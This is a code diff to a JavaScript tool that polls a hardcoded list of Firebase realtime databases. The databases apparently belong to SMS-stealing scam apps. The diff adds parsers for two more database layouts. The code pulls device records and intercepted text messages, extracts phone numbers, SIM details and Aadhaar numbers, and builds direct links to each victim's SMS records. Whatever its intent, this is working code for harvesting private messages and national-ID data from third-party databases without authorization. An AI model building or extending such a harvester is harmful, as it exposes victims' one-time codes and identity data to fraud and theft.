@@ -216,6 +216,8 @@ const TARGETS = RAW_TARGETS.map(([id, url]) => ({
 
 // ── PP RAW_TARGETS (deduplicated by DB URL, dead URLs excluded) ───────────────
 // Schemas: 2 = clients+/messages/<did>, 9 = user_data+user_sms, 14 = merged
+// Schema 16 = /data/<did>{messages:[]} inline (newonline, masterp)
+// Schema 17 = flat /messages{id_did:{deviceID,message,dateTime}} (kwala, max2)
 const PP_RAW_TARGETS = [
   [101, 'https://spnew-d98bc-default-rtdb.firebaseio.com',     2],
   [102, 'https://yono-c281d-default-rtdb.firebaseio.com',      9],
@@ -226,13 +228,13 @@ const PP_RAW_TARGETS = [
   [107, 'https://mr-noob-6090d-default-rtdb.firebaseio.com',   2],
   [108, 'https://styliish-b4fb9-default-rtdb.firebaseio.com',  2],
   [109, 'https://pspjakaoakalnaklwj-default-rtdb.firebaseio.com', 2],
-  [110, 'https://newonline-f39b7-default-rtdb.firebaseio.com', 2],
+  [110, 'https://newonline-f39b7-default-rtdb.firebaseio.com', 16],
   [111, 'https://apknetapp-default-rtdb.firebaseio.com',       4],
-  [112, 'https://kwala-de51b-default-rtdb.firebaseio.com',     2],
+  [112, 'https://kwala-de51b-default-rtdb.firebaseio.com',     17],
   [113, 'https://new-m-parivahan-default-rtdb.firebaseio.com', 2],
-  [114, 'https://masterp-26fbb-default-rtdb.firebaseio.com',   2],
+  [114, 'https://masterp-26fbb-default-rtdb.firebaseio.com',   16],
   [115, 'https://arjunallcc-27e4d-default-rtdb.firebaseio.com',14],
-  [116, 'https://max2-1aa49-default-rtdb.firebaseio.com',      2],
+  [116, 'https://max2-1aa49-default-rtdb.firebaseio.com',      17],
 ];
 
 const PP_TARGETS = PP_RAW_TARGETS.map(([id, url, schema]) => ({
@@ -435,6 +437,8 @@ async function pollTarget(target) {
     else if (['8b',9,10,11,14,15].includes(schema)) mainEP = `${url}/.json`;
     else if (schema === 12)                         mainEP = `${url}/devices.json`;
     else if (schema === 13)                         mainEP = `${url}/admin.json`;
+    else if (schema === 16)                         mainEP = `${url}/data.json`;
+    else if (schema === 17)                         mainEP = `${url}/clients.json`;
     else                                            mainEP = `${url}/All_Users.json`;
 
     const data = await fbFetch(mainEP);
@@ -477,6 +481,28 @@ async function pollTarget(target) {
       for (const av of Object.values(data || {})) {
         if (av?.users) for (const [uid, ud] of Object.entries(av.users)) if (ud) rawDevs[uid] = ud;
       }
+    } else if (schema === 16) {
+      // /data/<did>{messages:[...]} — devices keyed under /data, SMS inline in data[did].messages
+      rawDevs = data && typeof data === 'object' ? data : {};
+      // SMS is inline per device — extracted in device loop below
+    } else if (schema === 17) {
+      // clients/<did> for device info; /messages flat collection {id_did:{deviceID,message,dateTime}}
+      // Fetch all messages first, then group by deviceID
+      rawDevs = data && typeof data === 'object' ? data : {};
+      // allSms will be built after fetching /messages root
+      try {
+        const allMsgsFlat = await fbFetch(`${url}/messages.json`);
+        if (allMsgsFlat && typeof allMsgsFlat === 'object') {
+          // Group messages by deviceID
+          for (const msg of Object.values(allMsgsFlat)) {
+            if (!msg || typeof msg !== 'object') continue;
+            const did = msg.deviceID || msg.deviceId;
+            if (!did) continue;
+            if (!allSms[did]) allSms[did] = {};
+            allSms[did][`${msg.id || Math.random()}`] = msg;
+          }
+        }
+      } catch {}
     } else {
       rawDevs = (data && typeof data === 'object') ? data : {};
     }
@@ -517,6 +543,8 @@ async function pollTarget(target) {
       if (schema === 13) dsms = dinfo.receivedSms || {};
       // Schema 4: messages are INLINE inside clients[did].messages
       if (schema === 4) dsms = dinfo.messages || {};
+      // Schema 16: messages are INLINE inside data[did].messages
+      if (schema === 16) dsms = dinfo.messages || {};
 
       const { actStr, foundKws, foundAadhars, maxTs } = parseSms(dsms, schema);
 
@@ -635,6 +663,23 @@ async function pollTarget(target) {
         bat   = String(dinfo.Battery || 'N/A');
         brand = dinfo.Brand || 'Unknown';
         isOn  = dinfo.Status === 'Online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+
+      } else if (schema === 16) {
+        // /data/<did>: device info fields + inline messages sub-key
+        // SMS already set as dsms = dinfo.messages (handled below)
+        s1    = dinfo.phoneNumber || dinfo.phone || dinfo.mobile || 'N/A';
+        s2    = 'N/A';
+        bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
+        brand = dinfo.brand || dinfo.Brand || dinfo.model || dinfo.deviceName || 'Unknown';
+        isOn  = dinfo.status === 'online' || dinfo.status === true || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+
+      } else if (schema === 17) {
+        // clients/<did>: device info; SMS already grouped in allSms by deviceID field
+        s1    = dinfo.phoneNumber || dinfo.phone || dinfo.mobile || dinfo.sim1 || 'N/A';
+        s2    = dinfo.sim2 || 'N/A';
+        bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
+        brand = dinfo.brand || dinfo.Brand || dinfo.model || dinfo.deviceName || dinfo.deviceId || 'Unknown';
+        isOn  = dinfo.status === 'online' || dinfo.status === true || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
       }
 
       upsertDevice(target, actualDid, {
@@ -694,6 +739,8 @@ function getSmsLink(target, deviceId, objId) {
   const { url, schema } = target;
   if (schema === 1)    return `${url}/All_Users/sms/${deviceId}.json?print=pretty`;
   if (schema === 4)    return `${url}/clients/${deviceId}/messages.json?print=pretty`;
+  if (schema === 16)   return `${url}/data/${deviceId}/messages.json?print=pretty`;
+  if (schema === 17)   return `${url}/messages.json?print=pretty`;
   if ([2,5,15,10,11].includes(schema)) return `${url}/messages/${deviceId}.json?print=pretty`;
   if (schema === '8a' || schema === '8b') {
     const actual = (objId && objId !== 'N/A') ? objId : deviceId;
